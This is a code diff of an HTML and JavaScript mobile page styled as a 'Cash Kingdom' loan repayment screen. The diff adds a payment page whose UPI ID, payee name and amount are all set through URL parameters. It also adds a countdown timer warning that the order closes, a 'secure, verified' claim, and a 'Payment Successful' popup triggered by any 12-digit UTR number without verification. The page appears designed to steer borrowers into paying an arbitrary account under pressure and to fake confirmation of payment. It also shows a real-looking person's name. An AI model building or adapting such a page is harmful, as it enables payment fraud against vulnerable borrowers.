@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Cash Kingdom - Secure Repayment</title>
+    <title>Secure Payment Gateway</title>
     <style>
         :root {
             --primary-blue: #0A84FF;
@@ -16,134 +16,268 @@
         }
 
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; background-color: var(--bg-gray); color: var(--text-dark); -webkit-font-smoothing: antialiased; padding-bottom: constant(safe-area-inset-bottom); padding-bottom: safe-area-inset-bottom; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; background-color: var(--bg-gray); color: var(--text-dark); -webkit-font-smoothing: antialiased; }
 
-        /* HEADER & NAVIGATION */
-        .header { background: #fff; padding: 16px 20px; display: flex; align-items: center; border-bottom: 1px solid var(--border-color); position: sticky; top: 0; z-index: 100; box-shadow: 0 1px 3px rgba(0,0,0,0.03); }
-        .back-btn { font-size: 24px; cursor: pointer; position: absolute; left: 16px; color: var(--primary-blue); font-weight: 500; text-decoration: none;}
-        .header-text { font-size: 18px; font-weight: 600; width: 100%; text-align: center; }
-
+        /* ========================================================
+           FIRST PAGE: REPAY SCREEN (PREMIUM LOOK)
+           ======================================================== */
+        #repay-page { display: block; padding-bottom: 40px; }
+        .repay-header { background: #fff; padding: 16px 20px; display: flex; align-items: center; border-bottom: 1px solid var(--border-color); position: sticky; top: 0; z-index: 100; box-shadow: 0 1px 3px rgba(0,0,0,0.03); }
+        .repay-back-btn { font-size: 24px; cursor: pointer; position: absolute; left: 16px; color: var(--primary-blue); font-weight: 500; text-decoration: none; }
+        .repay-header-text { font-size: 18px; font-weight: 600; width: 100%; text-align: center; }
         .main-container { padding: 20px; max-width: 480px; margin: 0 auto; }
-
-        /* APP TITLE SECTION */
-        .app-section { display: flex; align-items: center; padding: 20px 0; margin-bottom: 5px; }
+        .app-section { display: flex; align-items: center; padding: 10px 0 20px 0; }
         .app-icon { background: linear-gradient(135deg, #FFB84D, #FF9F0A); color: white; width: 54px; height: 54px; border-radius: 14px; display: flex; align-items: center; justify-content: center; font-size: 26px; font-weight: bold; margin-right: 16px; box-shadow: 0 4px 8px rgba(255, 159, 10, 0.2); border: 2px solid #fff; }
         .app-name { font-size: 22px; font-weight: 700; color: #000; letter-spacing: -0.5px; }
-
-        /* LOAN CARD STYLES */
         .loan-card { background: #fff; border-radius: 20px; border: 1px solid var(--border-color); box-shadow: 0 5px 15px rgba(0,0,0,0.05); padding: 10px 20px 20px 20px; margin-bottom: 20px; }
         .row { display: flex; justify-content: space-between; padding: 14px 0; font-size: 15px; border-bottom: 1px dashed #f0f0f5; }
         .row:last-child { border-bottom: none; }
         .label { color: var(--text-gray); font-weight: 500; }
         .value { font-weight: 600; text-align: right; color: var(--text-dark); }
-        .final-amt { font-size: 20px; color: var(--danger-red); font-weight: 800; padding-top: 18px; border-top: 1px solid var(--border-color); margin-top: 5px;}
-
-        /* UTR & BUTTON SECTION */
+        .final-amt { font-size: 20px; color: var(--danger-red); font-weight: 800; padding-top: 18px; border-top: 1px solid var(--border-color); margin-top: 5px; }
         .action-card { background: #fff; border-radius: 20px; border: 1px solid var(--border-color); padding: 20px; margin-bottom: 25px; box-shadow: 0 3px 8px rgba(0,0,0,0.02); }
-        .utr-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; background: #fff; }
+        .utr-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
         .utr-text { font-size: 14px; color: var(--text-gray); font-weight: 500; }
-        .submit-btn { background: var(--border-color); border: none; padding: 10px 22px; color: var(--text-gray); border-radius: 25px; font-size: 14px; font-weight: 600; cursor: not-allowed; transition: all 0.2s; }
-        .submit-btn.active { background: var(--primary-blue); color: white; cursor: pointer; box-shadow: 0 2px 5px rgba(10, 132, 255, 0.15); }
-
-        /* Main Repay Button */
+        .repay-utr-btn { background: var(--border-color); border: none; padding: 8px 18px; color: var(--text-gray); border-radius: 25px; font-size: 13px; font-weight: 600; cursor: not-allowed; }
         .repay-btn { background: var(--primary-blue); border: none; color: white; width: 100%; padding: 18px; border-radius: 35px; font-size: 17px; font-weight: 700; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 10px 20px rgba(10, 132, 255, 0.2); }
-        .repay-btn:active { transform: translateY(1px); box-shadow: 0 5px 10px rgba(10, 132, 255, 0.15); filter: brightness(0.95); }
+        .repay-btn:active { transform: translateY(1px); filter: brightness(0.95); }
+        .tips-text { text-align: center; color: var(--text-gray); font-size: 14px; margin-top: 25px; font-weight: 500; }
 
-        .tips-text { text-align: center; color: var(--text-gray); font-size: 14px; margin-top: 25px; font-weight: 500; padding-bottom: 30px; }
-
+        /* ========================================================
+           SECOND PAGE: MAIN PAYMENT GATEWAY
+           ======================================================== */
+        #payment-page { display: none; background: #fcfcfc; min-height: 100vh; }
+        .pay-header { background: #ea5455; color: white; padding: 10px 15px; display: flex; align-items: center; justify-content: center; position: relative; height: 45px; }
+        .pay-back-btn { font-size: 28px; cursor: pointer; color: white; border: none; background: none; position: absolute; left: 10px; line-height: 1; }
+        .pay-header-text { font-size: 16px; font-weight: 600; }
+        .sub-header { background: #3b82f6; color: white; padding: 12px; text-align: center; font-size: 16px; font-weight: 500; }
+        .pay-container { padding: 15px; max-width: 480px; margin: 0 auto; }
+        .timer-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; font-size: 14px; }
+        .t-unit { background: #3b82f6; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; margin: 0 2px; }
+        .data-card { background: white; border: 1px solid #e5e7eb; border-radius: 8px; padding: 12px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.01); }
+        .p-label { color: #6b7280; font-size: 14px; width: 30%; text-align: left; }
+        .p-val { font-weight: bold; font-size: 15px; flex-grow: 1; text-align: right; margin-right: 15px; color: #111827; word-break: break-all; }
+        .copy-btn { border: 1px solid #3b82f6; color: #3b82f6; background: white; padding: 6px 16px; border-radius: 4px; font-size: 13px; cursor: pointer; font-weight: 500; }
+        .help-link { color: #3b82f6; font-size: 13px; text-decoration: none; display: inline-block; margin: 15px 0; cursor: pointer; }
+        .grid-apps { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .app-box { background: white; border: 1px solid #e5e7eb; border-radius: 8px; height: 65px; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 4px rgba(0,0,0,0.01); }
+        .pp-text { color: #5f259f; font-weight: bold; font-size: 18px; }
+        .gp-text { font-weight: bold; font-size: 18px; display: flex; gap: 1px; }
+        .utr-input-box { border-bottom: 1px solid #e5e7eb; display: flex; align-items: center; padding: 12px 0; margin-bottom: 20px; background: transparent; }
+        .utr-input-box b { margin-right: 15px; font-size: 16px; color: #000; }
+        .utr-input-box input { border: none; outline: none; font-size: 16px; width: 100%; color: #333; background: transparent; }
+        .submit-btn { background: #3b82f6; color: white; border: none; width: 100%; padding: 14px; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 10px rgba(59, 130, 246, 0.2); }
+        
+        /* COMMON MODALS */
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1000; }
+        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; border-radius: 20px; z-index: 1010; width: 85%; max-width: 350px; text-align: center; padding: 25px 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .success-modal { background-color: #52b788; color: white; }
+        .tick-icon { font-size: 50px; margin-bottom: 10px; }
+        .modal .white-btn { background: white; color: #52b788; border: none; padding: 10px 40px; border-radius: 25px; font-weight: bold; margin-top: 15px; cursor: pointer; }
+        .notice { margin-top: 20px; font-size: 12px; font-weight: bold; color: #ef4444; line-height: 1.5; text-align: left; }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <a href="#" class="back-btn">‹</a>
-    <span class="header-text">Repayment Overview</span>
+<div id="repay-page">
+    <div class="repay-header">
+        <span class="repay-back-btn">‹</span>
+        <span class="repay-header-text">Repayment Overview</span>
+    </div>
+
+    <div class="main-container">
+        <div class="app-section">
+            <div class="app-icon">₹</div>
+            <div class="app-name" id="loan_title">Cash Kingdom</div>
+        </div>
+
+        <div class="loan-card">
+            <div class="row">
+                <span class="label">Name</span>
+                <span class="value" id="repay_name">Noubade Sashikant H</span>
+            </div>
+            <div class="row">
+                <span class="label">Loan Amount</span>
+                <span class="value" id="repay_loan_amt">₹ 3,000</span>
+            </div>
+            <div class="row">
+                <span class="label">Amount Paid</span>
+                <span class="value">₹ 0</span>
+            </div>
+            <div class="row">
+                <span class="label">Overdue Charges</span>
+                <span class="value">₹ 0</span>
+            </div>
+            <div class="row final-amt">
+                <span class="label" style="color: var(--text-dark); font-weight: bold;">Total Repayment</span>
+                <span class="value" id="repay_total_amt">₹ 3,000</span>
+            </div>
+        </div>
+
+        <div class="action-card">
+            <div class="utr-row">
+                <span class="utr-text">Enter 12-digit UTR ID</span>
+                <button class="repay-utr-btn" id="utr_btn">Submit</button>
+            </div>
+            <input type="text" id="utr_input_first" placeholder="e.g. 123456789012" maxlength="12" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border-color); font-size: 15px;">
+        </div>
+
+        <button class="repay-btn" onclick="goToPaymentPage()">Pay Total Due (₹ <span id="repay_btn_amt">3,000</span>)</button>
+
+        <div class="tips-text">This is a secure payment. Verified by Cash Kingdom.</div>
+    </div>
 </div>
 
-<div class="main-container">
-    
-    <div class="app-section">
-        <div class="app-icon">₹</div>
-        <div class="app-name" id="loan_title">Cash Kingdom</div>
+
+<div id="payment-page">
+    <div class="pay-header">
+        <span class="pay-back-btn" onclick="goToRepayPage()">‹</span>
+        <span class="pay-header-text">Premium Server (Safe)</span>
     </div>
+    <div class="sub-header">Payment</div>
 
-    <div class="loan-card">
-        <div class="row">
-            <span class="label">Payee Name</span>
-            <span class="value" id="repay_name">Noubade Sashikant H</span>
+    <div class="pay-container">
+        <div class="timer-row">
+            <span>Order will be closed in:</span>
+            <span><span class="t-unit" id="m">8</span> : <span class="t-unit" id="s">25</span></span>
         </div>
-        <div class="row">
-            <span class="label">Loan Amount</span>
-            <span class="value" id="repay_loan_amt">₹ 3,000</span>
+
+        <div class="data-card">
+            <span class="p-label">Payee Name</span>
+            <span class="p-val" id="name">Noubade Sashikant H</span>
+            <button class="copy-btn" onclick="copy('name')">COPY</button>
         </div>
-        <div class="row">
-            <span class="label">Amount Paid</span>
-            <span class="value">₹ 0</span>
+        <div class="data-card">
+            <span class="p-label">Amount</span>
+            <span class="p-val">₹ <span id="amnt">3000</span></span>
+            <button class="copy-btn" onclick="copy('amnt')">COPY</button>
         </div>
-        <div class="row">
-            <span class="label">Overdue Charges</span>
-            <span class="value">₹ 0</span>
+        <div class="data-card">
+            <span class="p-label">VPA/UPI ID</span>
+            <span class="p-val" id="vpa">v.v.s@slc</span>
+            <button class="copy-btn" onclick="copy('vpa')">COPY</button>
         </div>
-        <div class="row final-amt">
-            <span class="label" style="color: var(--text-dark); font-weight: bold;">Total Repayment</span>
-            <span class="value bold-amt" id="repay_total_amt">₹ 3,000</span>
+
+        <div class="help-link">②How to transfer money🔗</div>
+
+        <div class="grid-apps">
+            <div class="app-box"><span class="pp-text">PhonePe</span></div>
+            <div class="app-box"><div class="gp-text"><span style="color: #4285F4;">G</span><span style="color: #EA4335;">P</span><span style="color: #FBBC05;">a</span><span style="color: #34A853;">y</span></div></div>
         </div>
+
+        <div class="utr-input-box">
+            <b>UTR</b>
+            <input type="text" id="utr_input" placeholder="Input UTR number" maxlength="12">
+        </div>
+        <button class="submit-btn" onclick="submitUTR()">Submit UTR</button>
+
+        <div class="notice">Notice: 1. One UPI can only transfer money once. 2. Don't change the payment amount.</div>
     </div>
+</div>
 
-    <div class="action-card">
-        <div class="utr-row">
-            <span class="utr-text">Enter 12-digit UTR ID</span>
-            <button class="submit-btn" id="utr_btn">Submit</button>
-        </div>
-        <input type="text" id="utr_input_first" placeholder="e.g. 123456789012" maxlength="12" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border-color); font-size: 15px;">
-    </div>
-
-    <button class="repay-btn" onclick="goToPaymentPage()">Pay Total Due (₹ <span id="repay_btn_amt">3,000</span>)</button>
-
-    <div class="tips-text">This is a secure payment. Verified by Cash Kingdom.</div>
+<div class="overlay" id="overlay" onclick="closeAll()"></div>
+<div id="success-modal" class="modal success-modal">
+    <div class="tick-icon">✓</div>
+    <h2>Payment Successful</h2>
+    <p>Thanks for your payment!</p>
+    <button class="white-btn" onclick="closeAll()">Close</button>
 </div>
 
 <script>
     const params = new URLSearchParams(window.location.search);
     
-    let defaultAmount = "3,000";
-    let formattedAmount = defaultAmount;
-
     if(params.get('loanInput')) {
-        document.getElementById('loan_title').innerText = params.get('loanInput').replace(/_/g, ' ');
+        const loanName = params.get('loanInput').replace(/_/g, ' ').replace(/-/g, ' ');
+        document.getElementById('loan_title').innerText = loanName;
     }
     
     if(params.get('nameInput')) {
-        document.getElementById('repay_name').innerText = params.get('nameInput').replace(/_/g, ' ');
+        const fullName = params.get('nameInput').replace(/_/g, ' ').replace(/-/g, ' ');
+        document.getElementById('repay_name').innerText = fullName;
+        document.getElementById('name').innerText = fullName;
     }
     
     if(params.get('amntInput')) {
         const amount = params.get('amntInput');
-        formattedAmount = "₹ " + Number(amount).toLocaleString('en-IN');
-        document.getElementById('repay_loan_amt').innerText = formattedAmount;
-        document.getElementById('repay_total_amt').innerText = formattedAmount;
-        document.getElementById('repay_btn_amt').innerText = Number(amount).toLocaleString('en-IN');
+        const formatted = Number(amount).toLocaleString('en-IN');
+        document.getElementById('repay_loan_amt').innerText = "₹ " + formatted;
+        document.getElementById('repay_total_amt').innerText = "₹ " + formatted;
+        document.getElementById('repay_btn_amt').innerText = formatted;
+        document.getElementById('amnt').innerText = amount;
+    }
+    
+    if(params.get('vpaInput')) {
+        document.getElementById('vpa').innerText = params.get('vpaInput');
     }
 
-    // UTR input logic for styling submit button
-    const utrInput = document.getElementById('utr_input_first');
-    const utrBtn = document.getElementById('utr_btn');
-    utrInput.addEventListener('input', function() {
-        if (this.value.length === 12 && /^\d+$/.test(this.value)) {
-            utrBtn.classList.add('active');
-            utrBtn.innerText = "Submit UTR";
-        } else {
-            utrBtn.classList.remove('active');
-            utrBtn.innerText = "Submit";
-        }
-    });
-
+    // পেজ নেভিগেশন লজিক (ফিক্সড)
     function goToPaymentPage() {
-        // Here we keep your existing navigation logic
-        document.getElementById('repay-page').style.display = 'none'; // Make sure your second page ID matches
-        document.getElementById('payment-page').style.display = 'block'; 
+        document.getElementById('repay-page').style.display = 'none';
+        document.getElementById('payment-page').style.display = 'block';
         window.scrollTo(0, 0);
     }
+
+    function goToRepayPage() {
+        document.getElementById('payment-page').style.display = 'none';
+        document.getElementById('repay-page').style.display = 'block';
+        window.scrollTo(0, 0);
+    }
+
+    // ১ম পেজের UTR ইনপুট স্টাইলিং লজিক
+    const utrInputFirst = document.getElementById('utr_input_first');
+    const utrBtn = document.getElementById('utr_btn');
+    if(utrInputFirst && utrBtn) {
+        utrInputFirst.addEventListener('input', function() {
+            if (this.value.length === 12 && /^\d+$/.test(this.value)) {
+                utrBtn.style.background = "var(--primary-blue)";
+                utrBtn.style.color = "white";
+                utrBtn.style.cursor = "pointer";
+                utrBtn.innerText = "Submit UTR";
+            } else {
+                utrBtn.style.background = "var(--border-color)";
+                utrBtn.style.color = "var(--text-gray)";
+                utrBtn.style.cursor = "not-allowed";
+                utrBtn.innerText = "Submit";
+            }
+        });
+        
+        utrBtn.addEventListener('click', function() {
+            if (utrInputFirst.value.length === 12 && /^\d+$/.test(utrInputFirst.value)) {
+                document.getElementById('overlay').style.display = 'block';
+                document.getElementById('success-modal').style.display = 'block';
+            }
+        });
+    }
+
+    // ২য় পেজের UTR সাবমিট লজিক
+    function submitUTR() {
+        const utrVal = document.getElementById('utr_input').value;
+        if(utrVal.length === 12 && /^\d+$/.test(utrVal)) {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('success-modal').style.display = 'block';
+        } else { 
+            alert("Please enter 12-digit UTR"); 
+        }
+    }
+
+    function closeAll() {
+        document.getElementById('overlay').style.display = 'none';
+        document.getElementById('success-modal').style.display = 'none';
+    }
+
+    function copy(id) {
+        navigator.clipboard.writeText(document.getElementById(id).innerText);
+        alert("Copied!");
+    }
+
+    // টাইমার কাউন্টডাউন
+    let totalSec = (8 * 60) + 25;
+    setInterval(() => {
+        if(totalSec <= 0) return;
+        totalSec--;
+        document.getElementById('m').innerText = Math.floor(totalSec / 60);
+        document.getElementById('s').innerText = (totalSec % 60).toString().padStart(2, '0');
+    }, 1000);
 </script>
 </body>
 </html>
